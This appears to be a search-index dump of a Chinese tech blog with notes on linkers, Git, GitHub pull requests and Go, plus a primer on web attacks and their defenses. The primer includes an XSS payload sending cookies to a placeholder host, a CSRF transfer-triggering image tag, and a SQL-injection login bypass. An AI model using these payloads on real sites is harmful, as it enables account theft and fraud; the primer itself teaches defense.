重定位：链接器通过把每个符号定义与一个内存位置关联起来，然后修改所有对这些符号的引用，使得它们指向这个内存位置。  目标文件  可执行目标文件：可以直接在内存中执行； 可重定向目标文件：可与其它可重定向目标文件在链接阶段合并，创建一个可执行目标文件； 共享目标文件：这是一种特殊的可重定向目标文件，可以在运行时被动态加载进内存并链接；  动态链接 静态库有以下两个问题：\n 当静态库更新时那么整个程序都要重新进行链接； 对于 printf 这种标准函数库，如果每个程序都要有代码，这会极大浪费资源。  共享库是为了解决静态库的这两个问题而设计的，在 Linux 系统中通常用 .so 后缀来表示，Windows 系统上它们被称为 DLL。它具有以下特点：\n 在给定的文件系统中一个库只有一个文件，所有引用该库的可执行目标文件都共享这个文件，它不会被复制到引用它的可执行文件中； 在内存中，一个共享库的 .text 节（已编译程序的机器代码）的一个副本可以被不同的正在运行的进程共享。  参考资料  Tanenbaum A S, Bos H. Modern operating systems[M]. Prentice Hall Press, 2014. 汤子瀛, 哲凤屏, 汤小丹. 计算机操作系统[M]. 西安电子科技大学出版社, 2001. Bryant, R. E., \u0026amp; O’Hallaron, D. R. (2004). 深入理解计算机系统. 史蒂文斯. UNIX 环境高级编程 [M]. 人民邮电出版社, 2014. Operating System Notes Operating-System Structures Processes Inter Process Communication Presentation[1] Decoding UCS Invicta – Part 1  ","permalink":"https://www.fenghong.tech/blog/technology/computer-basic/","tags":["computer"],"title":"computer basic"},{"categories":["github","tools"],"contents":"如何给开源项目贡献代码  代码仓库管理者给你添加该仓库的写入权限，这样的话可以直接push 如果不能直接push（大多数情况），采用经典的fork \u0026amp; pull request来提交代码，下面讲述这种情况  PR方式贡献代码步骤  在 GitHub 上 fork 到自己的仓库，如 my_user/WxJava，然后 clone 到本地，并设置用户信息。  $ git clone git@github.com:my_user/WxJava.git $ cd weixin-java-tools $ git config user.name \u0026quot;yourname\u0026quot; $ git config user.email \u0026quot;your email\u0026quot;  修改代码后提交，并推送到自己的仓库。  $ #do some change on the content $ git commit -am \u0026quot;Fix issue #1: change something\u0026quot; $ git push  在 GitHub 网站上提交 Pull Request。 定期使用项目仓库内容更新自己仓库内容。  $ git remote add upstream https://github.com/Wechat-Group/WxJava $ git fetch upstream $ git checkout develop $ git rebase upstream/develop $ git push -f origin develop ","permalink":"https://www.fenghong.tech/blog/technology/github-pr/","tags":["github"],"title":"github pull request"},{"categories":["tools"],"contents":"[TOC]\n一、跨站脚本攻击 概念 跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。\n攻击原理 例如有一个论坛网站，攻击者可以在上面发布以下内容：\n\u0026lt;script\u0026gt;location.href=\u0026#34;//domain.com/?c=\u0026#34; + document.cookie\u0026lt;/script\u0026gt; 之后该内容可能会被渲染成以下形式：\n\u0026lt;p\u0026gt;\u0026lt;script\u0026gt;location.href=\u0026#34;//domain.com/?c=\u0026#34; + document.cookie\u0026lt;/script\u0026gt;\u0026lt;/p\u0026gt; 另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。\n危害  窃取用户的 Cookie 伪造虚假的输入表单骗取个人信息 显示伪造的文章或者图片  防范手段 1. 设置 Cookie 为 HttpOnly 设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，就无法通过 document.cookie 获取用户 Cookie 信息。\n2. 过滤特殊字符 例如将 \u0026lt; 转义为 \u0026amp;lt;，将 \u0026gt; 转义为 \u0026amp;gt;，从而避免 HTML 和 Jascript 代码的运行。\n富文本编辑器允许用户输入 HTML 代码，就不能简单地将 \u0026lt; 等字符进行过滤了，极大地提高了 XSS 攻击的可能性。\n富文本编辑器通常采用 XSS filter 来防范 XSS 攻击，通过定义一些标签白名单或者黑名单，从而不允许有攻击性的 HTML 代码的输入。\n以下例子中，form 和 script 等标签都被转义，而 h 和 p 等标签将会保留。\n\u0026lt;h1 id=\u0026#34;title\u0026#34;\u0026gt;XSS Demo\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;123\u0026lt;/p\u0026gt; \u0026lt;form\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;q\u0026#34; value=\u0026#34;test\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;pre\u0026gt;hello\u0026lt;/pre\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; alert(/xss/); \u0026lt;/script\u0026gt; \u0026lt;h1\u0026gt;XSS Demo\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;123\u0026lt;/p\u0026gt; \u0026amp;lt;form\u0026amp;gt; \u0026amp;lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;q\u0026#34; value=\u0026#34;test\u0026#34;\u0026amp;gt; \u0026amp;lt;/form\u0026amp;gt; \u0026lt;pre\u0026gt;hello\u0026lt;/pre\u0026gt; \u0026amp;lt;script type=\u0026#34;text/javascript\u0026#34;\u0026amp;gt; alert(/xss/); \u0026amp;lt;/script\u0026amp;gt;  XSS 过滤在线测试\n 二、跨站请求伪造 概念 跨站请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。\nXSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户浏览器的信任。\n攻击原理 假如一家银行用以执行转账操作的 URL 地址如下：\nhttp://www.examplebank.com/withdraw?account=AccoutName\u0026amp;amount=1000\u0026amp;for=PayeeName。 那么，一个恶意攻击者可以在另一个网站上放置如下代码：\n\u0026lt;img src=\u0026quot;http://www.examplebank.com/withdraw?account=Alice\u0026amp;amount=1000\u0026amp;for=Badman\u0026quot;\u0026gt;。 如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 美元。\n这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。\n通过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。\n防范手段 1. 检查 Referer 首部字段 Referer 首部字段位于 HTTP 报文中，用于标识请求来源的地址。检查这个首部字段并要求请求来源的地址在同一个域名下，可以极大的防止 CSRF 攻击。\n这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。\n2. 添加校验 Token 在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验。例如服务器生成随机数并附加在表单中，并要求客户端传回这个随机数。\n3. 输入验证码 因为 CSRF 攻击是在用户无意识的情况下发生的，所以要求用户输入验证码可以让用户知道自己正在做的操作。\n三、SQL 注入攻击 概念 服务器上的数据库运行非法的 SQL 语句，主要通过拼接来完成。\n攻击原理 例如一个网站登录验证的 SQL 查询代码为：\nstrSQL = \u0026#34;SELECT * FROM users WHERE (name = \u0026#39;\u0026#34; + userName + \u0026#34;\u0026#39;) and (pw = \u0026#39;\u0026#34;+ passWord +\u0026#34;\u0026#39;);\u0026#34; 如果填入以下内容：\nuserName = \u0026#34;1\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1\u0026#34;; passWord = \u0026#34;1\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1\u0026#34;; 那么 SQL 查询字符串为：\nstrSQL = \u0026#34;SELECT * FROM users WHERE (name = \u0026#39;1\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;) and (pw = \u0026#39;1\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;);\u0026#34; 此时无需验证通过就能执行以下查询：\nstrSQL = \u0026#34;SELECT * FROM users;\u0026#34; 防范手段 1. 使用参数化查询 Java 中的 PreparedStatement 是预先编译的 SQL 语句，可以传入适当参数并且多次执行。由于没有拼接的过程，因此可以防止 SQL 注入的发生。\nPreparedStatement stmt = connection.prepareStatement(\u0026#34;SELECT * FROM users WHERE userid=? AND password=?\u0026#34;); stmt.setString(1, userid); stmt.setString(2, password); ResultSet rs = stmt.executeQuery(); 2. 单引号转换 将传入的参数中的单引号转换为连续两个单引号，PHP 中的 Magic quote 可以完成这个功能。\n四、拒绝服务攻击 拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。\n分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。\n参考资料  维基百科：跨站脚本 维基百科：SQL 注入攻击 维基百科：跨站点请求伪造 维基百科：拒绝服务攻击  ","permalink":"https://www.fenghong.tech/blog/tools/hacker-attach/","tags":["sql","hack"],"title":"hacker attach"},{"categories":["ops"],"contents":"[TOC]\n集中式与分布式 Git 属于分布式版本控制系统，而 SVN 属于集中式。\n集中式版本控制只有中心服务器拥有一份代码，而分布式版本控制每个人的电脑上就有一份完整的代码。\n集中式版本控制有安全性问题，当中心服务器挂了所有人都没办法工作了。\n集中式版本控制需要连网才能工作，如果网速过慢，那么提交一个文件的会慢的无法让人忍受。而分布式版本控制不需要连网就能工作。\n分布式版本控制新建分支、合并分支操作速度非常快，而集中式版本控制新建一个分支相当于复制一份完整代码。\n中心服务器 中心服务器用来交换每个用户的修改，没有中心服务器也能工作，但是中心服务器能够 24 小时保持开机状态，这样就能更方便的交换修改。\nGithub 就是一个中心服务器。\n工作流 新建一个仓库之后，当前目录就成为了工作区，工作区下有一个隐藏目录 .git，它属于 Git 的版本库。\nGit 版本库有一个称为 stage 的暂存区，还有自动创建的 master 分支以及指向分支的 HEAD 指针。\n git add files 把文件的修改添加到暂存区 git commit 把暂存区的修改提交到当前分支，提交之后暂存区就被清空了 git reset \u0026ndash; files 使用当前分支上的修改覆盖暂缓区，用来撤销最后一次 git add files git checkout \u0026ndash; files 使用暂存区的修改覆盖工作目录，用来撤销本地修改  可以跳过暂存区域直接从分支中取出修改，或者直接提交修改到分支中。\n git commit -a 直接把所有文件的修改添加到暂缓区然后执行提交 git checkout HEAD \u0026ndash; files 取出最后一次修改，可以用来进行回滚操作  分支实现 使用指针将每个提交连接成一条时间线，HEAD 指针指向当前分支指针。\n新建分支是新建一个指针指向时间线的最后一个节点，并让 HEAD 指针指向新分支表示新分支成为当前分支。\n每次提交只会让当前分支指针向前移动，而其它分支指针不会移动。\n合并分支也只需要改变指针即可。\n冲突 当两个分支都对同一个文件的同一行进行了修改，在分支合并时就会产生冲突。\nGit 会使用 \u0026laquo;\u0026laquo;\u0026laquo;\u0026lt; ，======= ，\u0026raquo;\u0026raquo;\u0026raquo;\u0026gt; 标记出不同分支的内容，只需要把不同分支中冲突部分修改成一样就能解决冲突。\n\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt; HEAD Creating a new branch is quick \u0026amp; simple. ======= Creating a new branch is quick AND simple. \u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt; feature1 Fast forward \u0026ldquo;快进式合并\u0026rdquo;（fast-farward merge），会直接将 master 分支指向合并的分支，这种模式下进行分支合并会丢失分支信息，也就不能在分支历史上看出分支信息。\n可以在合并时加上 \u0026ndash;no-ff 参数来禁用 Fast forward 模式，并且加上 -m 参数让合并时产生一个新的 commit。\n$ git merge --no-ff -m \u0026quot;merge with no-ff\u0026quot; dev 分支管理策略 master 分支应该是非常稳定的，只用来发布新版本；\n日常开发在开发分支 dev 上进行。\n储藏（Stashing） 在一个分支上操作之后，如果还没有将修改提交到分支上，此时进行切换分支，那么另一个分支上也能看到新的修改。这是因为所有分支都共用一个工作区的缘故。\n可以使用 git stash 将当前分支的修改储藏起来，此时当前工作区的所有修改都会被存到栈上，也就是说当前工作区是干净的，没有任何未提交的修改。此时就可以安全的切换到其它分支上了。\n$ git stash Saved working directory and index state \\ \u0026quot;WIP on master: 049d078 added the index file\u0026quot; HEAD is now at 049d078 added the index file (To restore them type \u0026quot;git stash apply\u0026quot;) 该功能可以用于 bug 分支的实现。如果当前正在 dev 分支上进行开发，但是此时 master 上有个 bug 需要修复，但是 dev 分支上的开发还未完成，不想立即提交。在新建 bug 分支并切换到 bug 分支之前就需要使用 git stash 将 dev 分支的未提交修改储藏起来。\nSSH 传输设置 Git 仓库和 Github 中心仓库之间的传输是通过 SSH 加密。\n如果工作区下没有 .ssh 目录，或者该目录下没有 id_rsa 和 id_rsa.pub 这两个文件，可以通过以下命令来创建 SSH Key：\n$ ssh-keygen -t rsa -C \u0026quot;youremail@example.com\u0026quot; 然后把公钥 id_rsa.pub 的内容复制到 Github \u0026ldquo;Account settings\u0026rdquo; 的 SSH Keys 中。\n.gitignore 文件 忽略以下文件：\n 操作系统自动生成的文件，比如缩略图； 编译生成的中间文件，比如 Java 编译产生的 .class 文件； 自己的敏感信息，比如存放口令的配置文件。  不需要全部自己编写，可以到 https://github.com/github/gitignore 中进行查询。\nGit 命令一览 比较详细的地址：http://www.cheat-sheets.org/saved-copy/git-cheat-sheet.pdf\n参考资料  Git - 简明指南 图解 Git 廖雪峰 : Git 教程 Learn Git Branching  ","permalink":"https://www.fenghong.tech/blog/intro/git-flow/","tags":["git"],"title":"Git Flow"},{"categories":["golang"],"contents":"[TOC]\n前言 用更少的代码，更短的编译时间，创建运行更快的程序，享受更多的乐趣 对于学习 Go 编程语言的爱好者来说，这本书无疑是最适合你的一本书籍，这里包含了当前最全面的学习资源。本书通过对官方的在线文档、名人博客、书籍、相关文章以及演讲的资料收集和整理，并结合我自身在软件工程、编程语言和数据库开发的授课经验，将这些零碎的知识点组织成系统化的概念和技术分类来进行讲解。\n随着软件规模的不断扩大，诸多的学者和谷歌的开发者们在公司内部的软件开发过程中开始经历大量的挫折，在诸多问题上都不能给出令人满意的解决方案，尤其是在使用 C++ 来开发大型的服务端软件时，情况更是不容乐观。由于二进制文件一般都是非常巨大的，因此需要耗费大量的时间在编译这些文件上，同时编程语言的设计思想也已经非常陈旧，这些情况都充分证明了现有的编程语言已不符合时下的生产环境。尽管硬件在过去的几十年中有了飞速的发展，但人们依旧没有找到机会去改变 C++ 在软件开发的重要地位，并在实际开发过程中忍受着它所带来的令人头疼的一些问题。因此学者们坐下来总结出了现在生产环境与软件开发之间的主要矛盾，并尝试设计一门全新的编程语言来解决这些问题。\n以下就是他们讨论得出的对编程语言的设计要求：\n 能够以更快的速度开发软件 开发出的软件能够很好地在现代的多核计算机上工作 开发出的软件能够很好地在网络环境下工作 使人们能够享受软件开发的过程  Go 语言就在这样的环境下诞生了，它让人感觉像是 Python 或 Ruby 这样的动态语言，但却又拥有像 C 或者 Java 这类语言的高性能和安全性。\nGo 语言出现的目的是希望在编程领域创造最实用的方式来进行软件开发。它并不是要用奇怪的语法和晦涩难懂的概念来从根本上推翻已有的编程语言，而是建立并改善了 C、Java、C# 中的许多语法风格。它提倡通过接口来针对面向对象编程，通过 goroutine 和 channel 来支持并发和并行编程。\n这本书是为那些想要学习 Go 这门全新的，迷人的和充满希望的编程语言的开发者量身定做的。当然，你在学习 Go 语言之前需要具备一些关于编程的基础知识和经验，并且拥有合适的学习环境，但你并不需要对 C 或者 Java 或其它类似的语言有非常深入的了解。\n对于那些熟悉 C 或者面向对象编程语言的开发者，我们将会在本书中用 Go 和一些编程语言的相关概念进行比较（书中会使用大家所熟知的缩写 “OO” 来表示面向对象）。\n本书将会从最基础的概念讲起，同时也会讨论一些类似在应用 goroutine 和 channel 时有多少种不同的模式，如何在 Go 语言中使用谷歌 API，如何操作内存，如何在 Go 语言中进行程序测试和如何使用模板来开发 Web 应用这些高级概念和技巧。\n在本书的第一部分，我们将会讨论 Go 语言的起源（第 1 章），以及如何安装 Go 语言（第 2 章）和开发环境（第 3 章）。\n在本书的第二部分，我们将会带领你贯穿 Go 语言的核心思想，譬如简单与复杂类型（第 4、7、8 章），控制结构（第 5 章），函数（第 6 章），结构与方法（第 10 章）和接口（第 11 章）。我们会对 Go 语言的函数式和面向对象编程进行透彻的讲解，包括如何使用 Go 语言来构造大型项目（第 9 章）。\n在本书的第三部分，你将会学习到如何处理不同格式的文件（第 12 章）和如何在 Go 语言中巧妙地使用错误处理机制（第 13 章）。然后我们会对 Go 语言中最值得称赞的设计 goroutine 和 channel 进行并发和多核应用的基本技巧的讲解（第 14 章）。最后，我们会讨论如何将 Go 语言应用到分布式和 Web 应用中的相关网络技巧（第 15 章）。\n我们会在本书的第四部分向你展示许多 Go 语言的开发模式和一些编码规范，以及一些非常有用的代码片段（第 18 章）。在前面章节完成对所有的 Go 语言技巧的学习之后，你将会学习如何构造一个完整 Go 语言项目（第 19 章），然后我们会介绍一些关于 Go 语言在云（Google App Engine）方面的应用（第 20 章）。在本书的最后一章（第 21 章），我们会讨论一些在全世界范围内已经将 Go 语言投入实际开发的公司和组织。本书将会在最后给出一些对 Go 语言爱好者的引用，Go 相关包和工具的参考，以及章节练习的答案和所有参考资源和文献的清单。\nGo 语言有一个被称之为 “没有废物” 的宗旨，就是将一切没有必要的东西都去掉，不能去掉的就无底线地简化，同时追求最大程度的自动化。他完美地诠释了敏捷编程的 KISS 秘诀：短小精悍！\nGo 语言通过改善或去除在 C、C++ 或 Java 中的一些所谓“开放”特性来让开发者们的工作更加便利。这里只举例其中的几个，比如对于变量的默认初始化，内存分配与自动回收，以及更简洁却不失健壮的控制结构。同时我们也会发现 Go 语言旨在减少不必要的编码工作，这使得 Go 语言的代码更加简洁，从而比传统的面向对象语言更容易阅读和理解。\n与 C++ 或 Java 这些有着庞大体系的语言相比，Go 语言简洁到可以将它整个的装入你的大脑中，而且比学习 Scala（Java 的并发语言）有更低的门槛，真可谓是 21 世纪的 C 语言！\n作为一门系统编程语言，你不应该为 Go 语言的大多数代码示例和练习都和控制台有着密不可分的关系而感到惊奇，因为提供平台依赖性的 GUI（用户界面）框架并不是一个简单的任务。有许多由第三方发起的 GUI 框架项目正在如火如荼地进行中，或许我们会在不久的将来看到一些可用的 Go 语言 GUI 框架。不过现阶段的 Go 语言已经提供了大量有关 Web 方面的功能，我们可以通过它强大的 http 和 template 包来达到 Web 应用的 GUI 实现。\n我们会经常涉及到一些关于 Go 语言的编码规范，了解和使用这些已经被广泛认同的规范应该是你学习阶段最重要的实践。我会在书中尽量使用已经讲解的概念或者技巧来解释相关的代码示例，以避免你在不了解某些高级概念的情况下而感到迷茫。\n我们通过 227 个完整的代码示例和书中的解释说明来对所有涉及到的概念和技巧进行彻底的讲解，你可以下载这些代码到你的电脑上运行，从而加深对概念的理解。\n本书会尽可能地将前后章节的内容联系起来，当然这也同时要求你通过学习不同的知识来对一个问题提出尽可能多的解决方案。记住，学习一门新语言的最佳方式就是实践，运行它的代码，修改并尝试更多的方案。因此，你绝对不可以忽略书中的 130 个代码练习，这将对你学习好 Go 语言有很大的帮助。比如，我们就为斐波那契算法提供了 13 个不同的版本，而这些版本都使用了不同的概念和技巧。\n你可以通过访问本书的 官方网站 下载书中的代码（译者注：所有代码文件已经包括在 GitHub 仓库中），并获得有关本书的勘误情况和内容更新。\n为了让你在成为 Go 语言大师的道路上更加顺利，我们会专注于一些特别的章节以提供 Go 语言开发模式的最佳实践，同时也会帮助初学者逃离一些语言的陷阱。第 18 章可以作为你在开发时的一个参考手册，因为当中包含了众多的有价值的代码片段以及相关的解释说明。\n最后要说明的是，你可以通过完整的索引来快速定位你需要阅读的章节。书中所有的代码都在 Go1.4 版本下测试通过。\n这里有一段来自在 C++、Java 和 Python 领域众所周知的专家 Bruce Eckel 的评论：\n“作为一个有着 C/C++ 背景的开发者，我在使用 Go 语言时仿佛呼吸到了新鲜空气一般，令人心旷神怡。我认为使用 Go 语言进行系统编程开发比使用 C++ 有着更显著的优势，因为它在解决一些很难用 C++ 解决的问题的同时，让我的工作变得更加高效。我并不是说 C++ 的存在是一个错误，相反地，我认为这是历史发展的必然结果。当我深陷在 C 语言这门略微比汇编语言好一点的泥潭时，我坚信任何语言的构造都不可能支持大型项目的开发。像垃圾回收或并发语言支持这类东西，在当时都是极其荒谬的主意，根本没有人在乎。C++ 向大型项目开发迈出了重要的第一步，带领我们走进这个广袤无垠的世界。很庆幸 Stroustrup 做了让 C++ 兼容 C 语言以能够让其编译 C 程序这个正确的决定。我们当时需要 C++ 的出现。”\n“之后我们学到了更多。我们毫无疑问地接受了垃圾回收，异常处理和虚拟机这些当年人们认为只有疯子才会想的东西。C++ 的复杂程度（新版的 C++ 甚至更加复杂）极大的影响了软件开发的高效性，这使得它再也不再适合这个时代。人们不再像过往那样认同在 C++ 中兼容使用 C 语言的方法，认为这些工作只是在浪费时间，牺牲人们的努力。就在此时，Go 语言已经成功地解决了 C++ 中那些本打算解决却未能解决的关键问题。”\n我非常想要向发明这门精湛的语言的 Go 开发团队表示真挚的感谢，尤其是团队的领导者 Rob Pike、Russ Cox 和 Andrew Gerrand，他们阐述的例子和说明都非常的完美。同时，我还要感谢 Miek Gieben、Frank Muller、Ryanne Dolan 和 Satish V.J. 给予我巨大的帮助，还有那些 golang-nuts 邮件列表里的所有的成员。\n欢迎来到 Go 语言开发的奇妙世界！\n链接  下一部分: Go 语言的起源，发展与普及  ","permalink":"https://www.fenghong.tech/blog/go/preface/","tags":["go"],"title":"前言"},{"categories":["golang"],"contents":"[TOC]\n资源/文章 全面型  The Go Programming Language Specification a8m/go-lang-cheat-sheet  入门练手项目  gobyexample 初学Go语言，哪类小项目适合练手 介绍 swapview 查看系统每个进程的 swap 使用情况 go语言值得学习的开源项目推荐 提到 Go 在 Github 上维护的一个 Go 优秀项目列表 有什么适合 Go 语言初学者的 Starter Project？  import 包  What does an underscore in front of an import statement mean in Golang? What does the \u0026lsquo;.\u0026rsquo; (dot or period) in a Go import statement do?  json 相关  What is the usage of backtick in golang structs definition?  命令行参数  Golang-使用命令行参数 golang 命令行处理  json 处理  Go 处理 JSON golang - 解析复杂json golang解析创建复杂嵌套的json数据  yaml 处理  A tour of YAML parsers for Go golang使用yaml格式解析构建配置文件 The right way to handle YAML in Go  Go包依赖管理  官方给出的这类工具列表 govendor glide Go Vendoring Tools 使用总结 大家推荐哪种golang包管理方式？ 讨论 Should I add \u0026ldquo;vendor\u0026rdquo; directory into .gitignore if I am using tools like glide or godep ? 讨论  最后一个问题，需要将 vendor 目录加入 git 中吗？包括参考了 github上一些大的golang项目，有的项目压根不存 vendor，有的只存了 vendor/vendor.json，也有的将整个 vendor 目录都加入 git 中了。\n虽然帖子里有提到都是文本不会很大，但是实际并不是这样，比如我用了 github.com/mattn/go-sqlite3 这个包，里面有一个 sqlite3-binding.c 占了 6.8M。\n（2017-10-10更新）再次研究了下，首先glide除了引入vendor目录，还引入了glide.yaml和glide.lock，两个额外文件在一级目录下，且使用起来比较麻烦；相比而言，govendor只引入了vendor目录，而它的版本元信息维护文件在vendor/vendor.json中，维护也比较简单，个人比较倾向这种方式。另外依然是上面的问题，最终我决定使用 hugo的方式，只维护vendor/vendor.json文件，依赖包自身内容先不维护了。\nQ\u0026amp;A Go get 被 X 的解决 http_proxy=127.0.0.1:8123 https_proxy=127.0.0.1:8123 go get -u ... 注意有些地址是 https 的，所以将两个都配置了。\n参考：\n GoGetProxyConfig Set proxy when executing “go get” command  关于单引号和双引号 如果是单引号，\u0026lsquo;b\u0026rsquo;，则输出98 如果是双引号，\u0026ldquo;b\u0026rdquo;，则输出b\n参考http://stackoverflow.com/a/34691123/1276501:\n In Go, '⌘' represents a single character (called a Rune), whereas \u0026quot;⌘\u0026quot; represents a string containing the character ⌘. This is true in many programming languages where the difference between strings and characters is notable, such as C++. Check out the \u0026ldquo;Code points, characters, and runes\u0026rdquo; section in the Go Blog on Strings\n ","permalink":"https://www.fenghong.tech/blog/go/go-resource/","tags":["go","resources"],"title":"Go 资源汇总"},{"categories":["golang"],"contents":"[TOC]\n教程  A Tour of Go Go by Example Go入门指南 / Github Go 语言程序设计 怎么学习golang？ 里面给出了一些不错的入门资料 Go Wiki  笔记 2017-01-01: 目前是官网入门指南 A Tour of Go 的笔记，大部分代码来至上面。\nGOROOT 和 GOPATH 关于 GOROOT 和 GOPATH 环境变量，如果是系统默认安装，而非自定义的安装目录，则 GOROOT 不需要设置。\n GOROOT must be set only when installing to a custom location. from\n 关于 GOPATH，必须设置，在get/build/install包时用到，第三方的包都会装在这个目录下，包括里面的二进制文件，所以建议将 $GOPATH/bin 加入到 $PATH 环境变量中。更多可以 go help gopath。\npackage 和 import 一个基本的例子:\npackage main import \u0026#34;fmt\u0026#34; func main() { fmt.Println(\u0026#34;Hello, World\u0026#34;) } 其中package我的理解是继承或者说基于的包名; main包表示这个程序的执行入口，编译时会将这个编译为可执行程序 (go build) 而不是 $GOPATH/pkg/ 下的静态库 (go install)。类似Python中的 if __name__ == '__main__'。\nimport 则表示导入要使用的标准库包或第三方包。\n参考:\n Understanding Golang Packages golang-book Packages  多个import语句可以使用 打包导入(factored import)，更优雅:\nimport ( \u0026#34;fmt\u0026#34; \u0026#34;math\u0026#34; ) // 等价 import \u0026#34;fmt\u0026#34; import \u0026#34;match\u0026#34; Exported names 在 Go 中，首字母大写的名称是 可被导出 的。当 import 包时，不被导出的包是无法被访问使用的，所以可以看到如上面的 fmt 包的 Println() 是以大写字母开头。\nFunction func add(x, y int) int { return x + y } func swap(x, y string) (string, string) { return y, x } 函数名后面圆括号里接 参数。\n参数后面指定 返回类型，多个相同的类型 不能 省略只写一个; 单个返回值可以不用圆括号括起来; 没有返回值则不写。\nNamed return values(命名返回值)，即在函数名后的返回值指定变量名，函数体内配合裸 return 来返回，注意 return 后面不要接返回值了，否则命名返回无效，使用的还是返回的值。另外在这种情况下，返回类型如果相同是可以省略只写一个：\nfunc swap(x, y string) (m, n string) { m, n = y, x return } 这里不能对参数做命名返回值返回，否则报错:\n// 错误的 func swap(x, y string) (x, y string) { x, y = y, x return } 函数参数，闭包没啥好写的\nVariable, Constants and Type 几种定义方式:\nvar i, j bool var x, y int = 1, 2 func main() { var m, n = \u0026#34;abc\u0026#34;, 100 z := 200 fmt.Println(i, j, x, y, m, n, z) } // 输出: false false 1 2 abc 100 200 Go中声明(declaration)和定义(definition)个人理解是不做区分的(和C不一样)，因为如果声明了变量但是未显式赋值，会隐式赋值给各类型的初始值(zero value，零值)。\n另外 var var_name var_type 和函数参数一样，变量名在前，类型在后。\n另外也可以不指定类型名，Go 会根据赋值判断相应类型\n最后，也可以不写 var，改用 := 的简明赋值语句，但是此语法 只能用于函数内，而 var 则可以在函数外使用。\n并且在至少有一个新变量，:= 可以用于重声明，比如下面的例子：\nfunc main() { var a, b = 1, 2 fmt.Println(a, b) // b 是重声明的，c 是新变量  // 如果改为 a, b := 3, 4 则报错：no new variables on left side of :=  c, b := 3, 4 fmt.Println(c, b) } 声明和导入包一样，可以 打包声明:\nvar ( i bool = false j int = 1 z float64 = 0.3 ) 关于类型关键词，其中 byte 是 uint8 的别名，rune 是 int32 的别名。\n一般情况下，数字用 int 即可。\n一些基本类型的零值:\n 数字: 0 布尔: false 字符串: \u0026quot;\u0026rdquo;  Go中类型的转换用 T(v)，将值 v 转换为类型 T:\ni := 1 f := float64(i) Go中类型转换 必须 显示指定（C中是可以做隐式转换的）。\n常量类型变量声明，使用关键字 const，不能使用 := 语法\nconst World = \u0026#39;世界\u0026#39; const ( Big = 1 \u0026lt;\u0026lt; 100 Small = Big \u0026gt;\u0026gt; 99 ) for / if / switch for支持几种语法:\n// init statement; condition expression; post statement // 另外这里注意只有后自增，没有前自增; 写C/C++时习惯了用前自增，这里总写错 for i := 1; i \u0026lt;= 10; i++ { fmt.Println(i) } // init / post statement 可以省略 sum := 1 for ; sum \u0026lt;= 10; { sum += sum } // 上面的例子，前后两个分号`;`也可以省略，这就是while的语法了 sum := 1 for sum \u0026lt;= 10 { sum += sum } // 上面的例子，退出条件也省略，就是无限循环了 for { } if语法:\n// condition expression if i \u0026lt;= 10 { ... } // if也支持init statement，if初始化的变量作用域只在if主体内 if i := 5; i \u0026lt;= 10 { ... } // if ... else if ... else if i := 5; i \u0026lt;= 3 { fmt.Println(\u0026#34;\u0026lt;= 3\u0026#34;) } else if i \u0026lt;= 6 { fmt.Println(\u0026#34;\u0026lt;= 6\u0026#34;) } else { fmt.Println(\u0026#34;\u0026gt; 6\u0026#34;) } switch语法:\n// 同样支持初始化语法 // 和C不同，每个case语句的行为是自动`break`，不需要手动写`break` // 如果想保持和C的行为一致，即匹配后还继续往下执行，则可以在case中加上`fallthrough` switch os := runtime.GOOS; os { case \u0026#34;darwin\u0026#34;: fmt.Println(\u0026#34;OS X.\u0026#34;) case \u0026#34;linux\u0026#34;: fmt.Println(\u0026#34;Linux.\u0026#34;) default: fmt.Printf(\u0026#34;%s.\u0026#34;, os) } // 如果switch condition没写，则默认表示 `true` // 行为和if ... else if ... else 一样 t := time.Now() switch { case t.Hour() \u0026lt; 12: fmt.Println(\u0026#34;Good morning!\u0026#34;) case t.Hour() \u0026lt; 17: fmt.Println(\u0026#34;Good afternoon.\u0026#34;) default: fmt.Println(\u0026#34;Good evening.\u0026#34;) } 注:\n 